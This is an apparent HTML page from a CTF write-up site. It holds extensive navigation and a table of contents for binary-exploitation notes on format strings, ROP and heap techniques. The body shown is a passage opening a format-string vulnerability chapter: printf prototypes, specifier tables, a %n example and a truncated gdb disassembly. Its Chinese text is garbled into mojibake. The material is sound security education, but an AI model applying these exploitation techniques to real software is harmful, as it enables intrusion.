  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/Cryptography/Guess/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Guess
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/Cryptography/MedicalImage/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    MedicalImage
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/Cryptography/more_calc/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    more_calc
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/Cryptography/myRSA/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    myRSA
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/Cryptography/Random_RSA/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Random_RSA
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/Cryptography/RSAssss/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    RSAssss
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/Cryptography/scissor.md" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    None
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/Cryptography/secret%20share/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    secret_share
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/Cryptography/simpleRSA/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    simpleRSA
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9_16" >
        
          
          <label class="md-nav__link" for="__nav_9_16" id="__nav_9_16_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    General Skills
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_9_16_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_9_16">
            <span class="md-nav__icon md-icon"></span>
            General Skills
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/General%20Skills/ChieftainsSecret/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ChieftainsSecret
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/General%20Skills/shuffle_code/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    shuffle_code
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/General%20Skills/xixixi/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    xixixi
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/General%20Skills/%E5%88%B0%E7%82%B9%E4%BA%86/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    åˆ°ç‚¹äº†
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/General%20Skills/%E5%B1%82%E5%B1%82%E5%8F%96%E8%AF%81/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    å±‚å±‚å–è¯
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/General%20Skills/%E5%B8%A6%E9%9F%B3%E4%B9%90%E5%AE%B6/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    å¸¦éŸ³ä¹å®¶
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/General%20Skills/%E8%80%83%E5%8F%A4/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    è€ƒå¤
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/General%20Skills/%E8%BF%9B%E5%88%B6%E5%8F%8D%E8%BD%AC/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    è¿›åˆ¶åè½¬
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/General%20Skills/%E9%B8%A3%E9%9B%8F%E6%81%8B/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    é¸£é›æ‹
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9_17" >
        
          
          <label class="md-nav__link" for="__nav_9_17" id="__nav_9_17_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Reverse Engineering
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_9_17_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_9_17">
            <span class="md-nav__icon md-icon"></span>
            Reverse Engineering
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/Reverse%20Engineering/apk1/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    apk1
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/Reverse%20Engineering/re1/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    re1
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9_18" >
        
          
          <label class="md-nav__link" for="__nav_9_18" id="__nav_9_18_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Web Exploitation
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_9_18_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_9_18">
            <span class="md-nav__icon md-icon"></span>
            Web Exploitation
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/Web%20Exploitation/easy_game/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    pcat/7/easygame
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#311" class="md-nav__link">
    <span class="md-ellipsis">
      3.1.1 æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ž
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    <span class="md-ellipsis">
      æ ¼å¼åŒ–è¾“å‡ºå‡½æ•°å’Œæ ¼å¼å­—ç¬¦ä¸²
    </span>
  </a>
  
    <nav class="md-nav" aria-label="æ ¼å¼åŒ–è¾“å‡ºå‡½æ•°å’Œæ ¼å¼å­—ç¬¦ä¸²">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    <span class="md-ellipsis">
      å‡½æ•°
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    <span class="md-ellipsis">
      è½¬æ¢æŒ‡ç¤ºç¬¦
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    <span class="md-ellipsis">
      é•¿åº¦
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_5" class="md-nav__link">
    <span class="md-ellipsis">
      ç¤ºä¾‹
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_6" class="md-nav__link">
    <span class="md-ellipsis">
      æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´žåŸºæœ¬åŽŸç†
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_7" class="md-nav__link">
    <span class="md-ellipsis">
      æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´žåˆ©ç”¨
    </span>
  </a>
  
    <nav class="md-nav" aria-label="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´žåˆ©ç”¨">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_8" class="md-nav__link">
    <span class="md-ellipsis">
      ä½¿ç¨‹åºå´©æºƒ
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_9" class="md-nav__link">
    <span class="md-ellipsis">
      æŸ¥çœ‹æ ˆå†…å®¹
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_10" class="md-nav__link">
    <span class="md-ellipsis">
      æŸ¥çœ‹ä»»æ„åœ°å€çš„å†…å­˜
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_11" class="md-nav__link">
    <span class="md-ellipsis">
      è¦†ç›–æ ˆå†…å®¹
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_12" class="md-nav__link">
    <span class="md-ellipsis">
      è¦†ç›–ä»»æ„åœ°å€å†…å­˜
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#x86-64" class="md-nav__link">
    <span class="md-ellipsis">
      x86-64 ä¸­çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ž
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ctf" class="md-nav__link">
    <span class="md-ellipsis">
      CTF ä¸­çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ž
    </span>
  </a>
  
    <nav class="md-nav" aria-label="CTF ä¸­çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ž">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#pwntools-pwnlibfmtstr" class="md-nav__link">
    <span class="md-ellipsis">
      pwntools pwnlib.fmtstr æ¨¡å—
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#312" class="md-nav__link">
    <span class="md-ellipsis">
      3.1.2 æ•´æ•°æº¢å‡º
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_13" class="md-nav__link">
    <span class="md-ellipsis">
      ä»€ä¹ˆæ˜¯æ•´æ•°æº¢å‡º
    </span>
  </a>
  
    <nav class="md-nav" aria-label="ä»€ä¹ˆæ˜¯æ•´æ•°æº¢å‡º">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_14" class="md-nav__link">
    <span class="md-ellipsis">
      ç®€ä»‹
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_15" class="md-nav__link">
    <span class="md-ellipsis">
      æ•´æ•°æº¢å‡ºçš„å±å®³
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_16" class="md-nav__link">
    <span class="md-ellipsis">
      æ•´æ•°æº¢å‡º
    </span>
  </a>
  
    <nav class="md-nav" aria-label="æ•´æ•°æº¢å‡º">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_17" class="md-nav__link">
    <span class="md-ellipsis">
      æœ‰ç¬¦å·æ•´æ•°æº¢å‡º
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_18" class="md-nav__link">
    <span class="md-ellipsis">
      æ— ç¬¦å·æ•°å›žç»•
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_19" class="md-nav__link">
    <span class="md-ellipsis">
      æˆªæ–­
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_20" class="md-nav__link">
    <span class="md-ellipsis">
      æ•´åž‹æå‡å’Œå®½åº¦æº¢å‡º
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_21" class="md-nav__link">
    <span class="md-ellipsis">
      æ¼æ´žå¤šå‘å‡½æ•°
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_22" class="md-nav__link">
    <span class="md-ellipsis">
      æ•´æ•°æº¢å‡ºç¤ºä¾‹
    </span>
  </a>
  
    <nav class="md-nav" aria-label="æ•´æ•°æº¢å‡ºç¤ºä¾‹">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_23" class="md-nav__link">
    <span class="md-ellipsis">
      ç¤ºä¾‹
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_24" class="md-nav__link">
    <span class="md-ellipsis">
      å®žæˆ˜
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#314-rop" class="md-nav__link">
    <span class="md-ellipsis">
      3.1.4 è¿”å›žå¯¼å‘ç¼–ç¨‹ï¼ˆROPï¼‰
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#rop" class="md-nav__link">
    <span class="md-ellipsis">
      ROP ç®€ä»‹
    </span>
  </a>
  
    <nav class="md-nav" aria-label="ROP ç®€ä»‹">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#gadgets" class="md-nav__link">
    <span class="md-ellipsis">
      å¯»æ‰¾ gadgets
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#gadgets_1" class="md-nav__link">
    <span class="md-ellipsis">
      å¸¸ç”¨çš„ gadgets
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#rop-emporium" class="md-nav__link">
    <span class="md-ellipsis">
      ROP Emporium
    </span>
  </a>
  
    <nav class="md-nav" aria-label="ROP Emporium">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ret2win32" class="md-nav__link">
    <span class="md-ellipsis">
      ret2win32
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ret2win" class="md-nav__link">
    <span class="md-ellipsis">
      ret2win
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#split32" class="md-nav__link">
    <span class="md-ellipsis">
      split32
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#split" class="md-nav__link">
    <span class="md-ellipsis">
      split
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#callme32" class="md-nav__link">
    <span class="md-ellipsis">
      callme32
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#callme" class="md-nav__link">
    <span class="md-ellipsis">
      callme
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#write432" class="md-nav__link">
    <span class="md-ellipsis">
      write432
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#write4" class="md-nav__link">
    <span class="md-ellipsis">
      write4
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#badchars32" class="md-nav__link">
    <span class="md-ellipsis">
      badchars32
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#badchars" class="md-nav__link">
    <span class="md-ellipsis">
      badchars
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#fluff32" class="md-nav__link">
    <span class="md-ellipsis">
      fluff32
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#fluff" class="md-nav__link">
    <span class="md-ellipsis">
      fluff
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pivot32" class="md-nav__link">
    <span class="md-ellipsis">
      pivot32
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pivot" class="md-nav__link">
    <span class="md-ellipsis">
      pivot
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#316-linux" class="md-nav__link">
    <span class="md-ellipsis">
      3.1.6 Linux å †åˆ©ç”¨ï¼ˆä¸Šï¼‰
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#linux" class="md-nav__link">
    <span class="md-ellipsis">
      Linux å †ç®€ä»‹
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#how2heap" class="md-nav__link">
    <span class="md-ellipsis">
      how2heap
    </span>
  </a>
  
    <nav class="md-nav" aria-label="how2heap">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#first_fit" class="md-nav__link">
    <span class="md-ellipsis">
      first_fit
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#fastbin_dup" class="md-nav__link">
    <span class="md-ellipsis">
      fastbin_dup
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#fastbin_dup_into_stack" class="md-nav__link">
    <span class="md-ellipsis">
      fastbin_dup_into_stack
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#fastbin_dup_consolidate" class="md-nav__link">
    <span class="md-ellipsis">
      fastbin_dup_consolidate
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#unsafe_unlink" class="md-nav__link">
    <span class="md-ellipsis">
      unsafe_unlink
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#house_of_spirit" class="md-nav__link">
    <span class="md-ellipsis">
      house_of_spirit
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#317-linux" class="md-nav__link">
    <span class="md-ellipsis">
      3.1.7 Linux å †åˆ©ç”¨ï¼ˆä¸­ï¼‰
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#how2heap_1" class="md-nav__link">
    <span class="md-ellipsis">
      how2heap
    </span>
  </a>
  
    <nav class="md-nav" aria-label="how2heap">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#poison_null_byte" class="md-nav__link">
    <span class="md-ellipsis">
      poison_null_byte
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#house_of_lore" class="md-nav__link">
    <span class="md-ellipsis">
      house_of_lore
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#overlapping_chunks" class="md-nav__link">
    <span class="md-ellipsis">
      overlapping_chunks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#overlapping_chunks_2" class="md-nav__link">
    <span class="md-ellipsis">
      overlapping_chunks_2
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#318-linux" class="md-nav__link">
    <span class="md-ellipsis">
      3.1.8 Linux å †åˆ©ç”¨ï¼ˆä¸‹ï¼‰
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#how2heap_2" class="md-nav__link">
    <span class="md-ellipsis">
      how2heap
    </span>
  </a>
  
    <nav class="md-nav" aria-label="how2heap">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#house_of_force" class="md-nav__link">
    <span class="md-ellipsis">
      house_of_force
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#unsorted_bin_into_stack" class="md-nav__link">
    <span class="md-ellipsis">
      unsorted_bin_into_stack
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#unsorted_bin_attack" class="md-nav__link">
    <span class="md-ellipsis">
      unsorted_bin_attack
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#house_of_einherjar" class="md-nav__link">
    <span class="md-ellipsis">
      house_of_einherjar
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#house_of_orange" class="md-nav__link">
    <span class="md-ellipsis">
      house_of_orange
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#319-linux" class="md-nav__link">
    <span class="md-ellipsis">
      3.1.9 Linux å †åˆ©ç”¨ï¼ˆå››ï¼‰
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#how2heap_3" class="md-nav__link">
    <span class="md-ellipsis">
      how2heap
    </span>
  </a>
  
    <nav class="md-nav" aria-label="how2heap">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#large_bin_attack" class="md-nav__link">
    <span class="md-ellipsis">
      large_bin_attack
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#3111-linux" class="md-nav__link">
    <span class="md-ellipsis">
      3.1.11 Linux å†…æ ¸æ¼æ´žåˆ©ç”¨
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_25" class="md-nav__link">
    <span class="md-ellipsis">
      ä»Žç”¨æˆ·æ€åˆ°å†…æ ¸æ€
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_26" class="md-nav__link">
    <span class="md-ellipsis">
      å†…æ ¸æ¼æ´žåˆ†ç±»
    </span>
  </a>
  
    <nav class="md-nav" aria-label="å†…æ ¸æ¼æ´žåˆ†ç±»">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_27" class="md-nav__link">
    <span class="md-ellipsis">
      æœªåˆå§‹åŒ–çš„ã€æœªéªŒè¯çš„ã€å·²æŸåçš„æŒ‡é’ˆè§£å¼•ç”¨
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_28" class="md-nav__link">
    <span class="md-ellipsis">
      å†…å­˜ç ´åæ¼æ´ž
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_29" class="md-nav__link">
    <span class="md-ellipsis">
      æ•´æ•°è¯¯ç”¨
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_30" class="md-nav__link">
    <span class="md-ellipsis">
      ç«žæ€æ¡ä»¶
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bug" class="md-nav__link">
    <span class="md-ellipsis">
      é€»è¾‘ bug
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  

  
  


<h1 id="binary-exploitation">Binary Exploitation</h1>
<h2 id="311">3.1.1 æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ž</h2>
<ul>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html#æ ¼å¼åŒ–è¾“å‡ºå‡½æ•°å’Œæ ¼å¼å­—ç¬¦ä¸²">æ ¼å¼åŒ–è¾“å‡ºå‡½æ•°å’Œæ ¼å¼å­—ç¬¦ä¸²</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´žåŸºæœ¬åŽŸç†">æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´žåŸºæœ¬åŽŸç†</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´žåˆ©ç”¨">æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´žåˆ©ç”¨</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html#x86-64-ä¸­çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ž">x86-64 ä¸­çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ž</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html#ctf-ä¸­çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ž">CTF ä¸­çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ž</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html#æ‰©å±•é˜…è¯»">æ‰©å±•é˜…è¯»</a></li>
</ul>
<h2 id="_1">æ ¼å¼åŒ–è¾“å‡ºå‡½æ•°å’Œæ ¼å¼å­—ç¬¦ä¸²</h2>
<p>åœ¨ C è¯­è¨€åŸºç¡€ç« èŠ‚ä¸­ï¼Œæˆ‘ä»¬è¯¦ç»†ä»‹ç»äº†æ ¼å¼åŒ–è¾“å‡ºå‡½æ•°å’Œæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å†…å®¹ã€‚åœ¨å¼€å§‹æŽ¢ç´¢æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´žä¹‹å‰ï¼Œå¼ºçƒˆå»ºè®®å›žé¡¾è¯¥ç« èŠ‚ã€‚è¿™é‡Œæˆ‘ä»¬ç®€å•å›žé¡¾å‡ ä¸ªå¸¸ç”¨çš„ã€‚</p>
<h3 id="_2">å‡½æ•°</h3>
<pre><code class="language-c">#include &lt;stdio.h&gt;

int printf(const char *format, ...);
int fprintf(FILE *stream, const char *format, ...);
int dprintf(int fd, const char *format, ...);
int sprintf(char *str, const char *format, ...);
int snprintf(char *str, size_t size, const char *format, ...);
</code></pre>
<h3 id="_3">è½¬æ¢æŒ‡ç¤ºç¬¦</h3>
<table>
<thead>
<tr>
<th>å­—ç¬¦</th>
<th>ç±»åž‹</th>
<th>ä½¿ç”¨</th>
</tr>
</thead>
<tbody>
<tr>
<td>d</td>
<td>4-byte</td>
<td>Integer</td>
</tr>
<tr>
<td>u</td>
<td>4-byte</td>
<td>Unsigned Integer</td>
</tr>
<tr>
<td>x</td>
<td>4-byte</td>
<td>Hex</td>
</tr>
<tr>
<td>s</td>
<td>4-byte ptr</td>
<td>String</td>
</tr>
<tr>
<td>c</td>
<td>1-byte</td>
<td>Character</td>
</tr>
</tbody>
</table>
<h3 id="_4">é•¿åº¦</h3>
<table>
<thead>
<tr>
<th>å­—ç¬¦</th>
<th>ç±»åž‹</th>
<th>ä½¿ç”¨</th>
</tr>
</thead>
<tbody>
<tr>
<td>hh</td>
<td>1-byte</td>
<td>char</td>
</tr>
<tr>
<td>h</td>
<td>2-byte</td>
<td>short int</td>
</tr>
<tr>
<td>l</td>
<td>4-byte</td>
<td>long int</td>
</tr>
<tr>
<td>ll</td>
<td>8-byte</td>
<td>long long int</td>
</tr>
</tbody>
</table>
<h3 id="_5">ç¤ºä¾‹</h3>
<pre><code class="language-c">#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
void main() {
    char *format = &quot;%s&quot;;
    char *arg1 = &quot;Hello World!\n&quot;;
    printf(format, arg1);
}
printf(&quot;%03d.%03d.%03d.%03d&quot;, 127, 0, 0, 1);    // &quot;127.000.000.001&quot;
printf(&quot;%.2f&quot;, 1.2345);   // 1.23
printf(&quot;%#010x&quot;, 3735928559);   // 0xdeadbeef

printf(&quot;%s%n&quot;, &quot;01234&quot;, &amp;n);  // n = 5
</code></pre>
<h2 id="_6">æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´žåŸºæœ¬åŽŸç†</h2>
<p>åœ¨ x86 ç»“æž„ä¸‹ï¼Œæ ¼å¼å­—ç¬¦ä¸²çš„å‚æ•°æ˜¯é€šè¿‡æ ˆä¼ é€’çš„ï¼Œçœ‹ä¸€ä¸ªä¾‹å­ï¼š</p>
<pre><code class="language-c">#include&lt;stdio.h&gt;
void main() {
    printf(&quot;%s %d %s&quot;, &quot;Hello World!&quot;, 233, &quot;\n&quot;);
}
gdb-peda$ disassemble main
Dump of assembler code for function main:
   0x0000053d &lt;+0&gt;:     lea    ecx,[esp+0x4]
   0x00000541 &lt;+4&gt;:     and    esp,0xfffffff0
   0x00000544 &lt;+7&gt;:     push   DWORD PTR [ecx-0x4]
   0x00000547 &lt;+10&gt;:    push   ebp
   0x00000548 &lt;+11&gt;:    mov    ebp,esp
   0x0000054a &lt;+13&gt;:    push   ebx
   0x0000054b &lt;+14&gt;:    push   ecx
   0x0000054c &lt;+15&gt;:    call   0x585 &lt;__x86.get_pc_thunk.ax&gt;
   0x00000551 &lt;+20&gt;:    add    eax,0x1aaf
   0x00000556 &lt;+25&gt;:    lea    edx,[eax-0x19f0]
   0x0000055c &lt;+31&gt;:    push   edx
   0x0000055d &lt;+32&gt;:    push   0xe9
   0x00000562 &lt;+37&gt;:    lea    edx,[eax-0x19ee]
   0x00000568 &lt;+43&gt;:    push   edx
   0x00000569 &lt;+44&gt;:    lea    edx,[eax-0x19e1]
   0x0000056f &lt;+50&gt;:    push   edx
